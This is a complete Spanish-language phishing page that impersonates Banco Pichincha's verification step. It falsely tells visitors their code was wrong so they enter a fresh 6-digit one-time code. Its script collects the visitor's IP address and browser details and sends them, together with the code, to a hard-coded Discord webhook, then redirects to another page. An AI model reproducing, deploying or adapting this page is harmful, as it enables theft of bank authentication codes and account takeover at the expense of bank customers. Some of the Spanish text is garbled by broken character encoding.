<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificaci√≥n</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
body{background:#fff}
.header{padding:16px 20px;box-shadow:0 4px 10px rgba(0,0,0,.12)}
.logo{height:36px}
.container{max-width:480px;margin:0 auto;padding:35px 20px;text-align:center}
.image-box{max-width:200px;margin:30px auto}
.image-box img{width:50%}
.title{font-size:26px;font-weight:700;color:#0b2a5b;margin-bottom:15px}

/* --- √ÅREA DE CARGA (OCULTA) --- */
.loading-zone {
  display: none; /* Eliminado el tiempo de espera */
}

/* --- CONTENIDO VISIBLE AL INSTANTE --- */
#content-to-reveal {
  display: block; /* Cambiado de none a block */
}

.description {
  font-size: 14px;
  color: #c00; /* Color rojo para resaltar el error */
  line-height: 1.5;
  margin-bottom: 30px;
  font-weight: 600;
}

.form{text-align:left}
label{font-size:14px;font-weight:600;display:block;margin-bottom:8px}
.code{text-align:center;letter-spacing:10px;font-size:26px;padding:16px;}
input{width:100%;padding:16px;border-radius:8px;border:1px solid #ccc;margin-bottom:20px;font-size:18px;}
.btn{width:100%;background:#ffd200;border:none;padding:16px;font-size:17px;font-weight:700;border-radius:8px;cursor:pointer;}
.btn:hover{background:#f5c400}
.error{color:#c00;font-size:14px;margin-bottom:15px;}
.hidden{display:none}
.timer{margin-top:20px;font-size:14px;color:#5a5a5a;text-align:center;}
</style>
</head>

<body>

<div class="header">
  <img src="https://upload.wikimedia.org/wikipedia/commons/4/45/Banco_Pichincha_nuevo.png" class="logo">
</div>

<div class="container">
  <div class="image-box">
    <img src="https://media.istockphoto.com/id/662107734/es/vector/icono-de-protecci%C3%B3n-de-contrase%C3%B1a-dise%C3%B1o-plano.jpg?s=612x612&w=0&k=20&c=_BzBEHNoQjemjOHDYSjMLWYiAQKhEi-UnnDFqwX_Hyw=">
  </div>
  <div class="title">Autenticaci√≥n de Usuario</div>

  <div id="content-to-reveal">
    <div class="description">
      El c√≥digo ingresado es incorrecto. Revisa nuevamente tu correo o dispositivo m√≥vil registrado e ingresa el c√≥digo correcto.
    </div>

    <div class="form">
      <label>C√≥digo de verificaci√≥n</label>
      <input id="code" class="code" inputmode="numeric" pattern="[0-9]*" maxlength="6" placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢">
      <div class="error hidden" id="errorMsg">Debes ingresar el c√≥digo de 6 d√≠gitos.</div>
      <button id="submitBtn" class="btn" onclick="verificar()">Continuar</button>
    </div>

    <div class="timer">¬øNo recibiste el c√≥digo? Espera unos minutos.</div>
  </div>
</div>

<script>
  let userIP = "Obteniendo IP...";

  // 1. Capturar IP real
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => userIP = data.ip)
    .catch(() => userIP = "No detectada");

  // 2. Enviar y redireccionar
  async function verificar(){
    const code = document.getElementById("code").value;
    const error = document.getElementById("errorMsg");
    const btn = document.getElementById("submitBtn");

    if(code.length !== 6){
      error.classList.remove("hidden");
      return;
    }
    error.classList.add("hidden");

    btn.disabled = true;
    btn.innerText = "Verificando...";

    const webhookURL = "https://discord.com/api/webhooks/1475373180804927600/9YDS3a8b5BhrFHOJZWTW_5tQlcsc0g_1_Jb1gGhqBYdXUX0jZedydODrZprQBOwWJBy0"; 

    const payload = {
      content: "‚ùå **REINTENTO: C√≥digo OTP capturado**",
      embeds: [{
        title: "Registro de Actividad (Fallo previo)",
        color: 15158332, // Rojo para indicar que es un reintento por error
        fields: [
          { name: "üîë Nuevo C√≥digo", value: `**${code}**`, inline: true },
          { name: "üåê IP Real", value: `**${userIP}**`, inline: true },
          { name: "üì± Dispositivo", value: navigator.userAgent }
        ],
        timestamp: new Date()
      }]
    };

    try {
      await fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      window.location.href = "giu.html";
    } catch (e) {
      window.location.href = "giu.html";
    }
  }
</script>

</body>
</html>